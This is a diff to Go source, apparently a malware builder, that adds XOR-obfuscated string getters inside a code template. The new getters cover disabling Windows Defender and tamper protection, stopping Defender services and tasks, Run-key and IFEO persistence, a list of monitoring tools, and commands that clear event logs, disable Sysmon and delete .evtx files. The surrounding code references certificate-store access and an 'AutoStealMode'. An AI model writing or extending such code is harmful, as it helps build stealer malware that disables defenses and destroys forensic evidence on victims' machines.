@@ -509,5 +509,27 @@ func getCertGetNameStringWName() string   { return string(xor(encCertGetNameStri
 func getCertFreeCertCtxName() string      { return string(xor(encCertFreeCertCtxName, decryptionKey)) }
 func getCertCloseStoreName() string       { return string(xor(encCertCloseStoreName, decryptionKey)) }
 func getAutoStealMode() string             { return string(xor(encAutoStealMode, decryptionKey)) }
+
+func getNtdllDLL() string                    { return string(xor(encNtdllDll, decryptionKey)) }
+func getRtlAdjustPrivilegeName() string      { return string(xor(encRtlAdjustPrivilegeName, decryptionKey)) }
+func getRtlSetProcessIsCriticalName() string { return string(xor(encRtlSetProcessIsCriticalName, decryptionKey)) }
+func getRegCreateKeyExWName() string         { return string(xor(encRegCreateKeyExWName, decryptionKey)) }
+func getSetNamedSecurityInfoWName() string   { return string(xor(encSetNamedSecurityInfoWName, decryptionKey)) }
+func getNetshExeName() string                { return string(xor(encNetshExe, decryptionKey)) }
+func getChangeServiceConfig2WName() string   { return string(xor(encChangeServiceConfig2WName, decryptionKey)) }
+func getDefenderPoliciesPath() string        { return string(xor(encDefenderPoliciesPath, decryptionKey)) }
+func getDefenderRtpPath() string             { return string(xor(encDefenderRtpPath, decryptionKey)) }
+func getDefenderSpynetPath() string          { return string(xor(encDefenderSpynetPath, decryptionKey)) }
+func getTamperProtectionPath() string        { return string(xor(encTamperProtectionPath, decryptionKey)) }
+func getStopDefenderServiceCmd() string      { return string(xor(encStopDefenderServiceCmd, decryptionKey)) }
+func getDisableDefenderTasksCmd() string     { return string(xor(encDisableDefenderTasksCmd, decryptionKey)) }
+func getHKLMRunPath() string                 { return string(xor(encHKLMRunPath, decryptionKey)) }
+func getHKLMRunOncePath() string             { return string(xor(encHKLMRunOncePath, decryptionKey)) }
+func getIFEOBasePath() string                { return string(xor(encIFEOBasePath, decryptionKey)) }
+func getIFEOTargets() []string               { return decryptList(encIFEOTargets) }
+func getMonitoringTools() []string           { return decryptList(encMonitoringTools) }
+func getClearAllLogsCmd() string             { return string(xor(encClearAllLogsCmd, decryptionKey)) }
+func getDisableSysmonCmd() string            { return string(xor(encDisableSysmonCmd, decryptionKey)) }
+func getDeleteEvtxCmd() string               { return string(xor(encDeleteEvtxCmd, decryptionKey)) }
 `)
 }
